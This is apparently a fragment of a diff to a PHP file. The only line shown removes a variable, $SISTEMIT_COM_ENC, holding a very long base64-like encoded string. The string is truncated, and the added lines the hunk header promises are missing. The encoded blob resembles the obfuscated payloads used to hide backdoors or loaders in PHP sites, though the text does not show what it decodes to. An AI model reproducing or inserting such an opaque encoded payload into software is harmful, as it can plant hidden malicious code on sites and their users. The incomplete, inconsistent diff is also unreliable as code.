@@ -1,3 +1,1373 @@
 <?php
-$SISTEMIT_COM_ENC = "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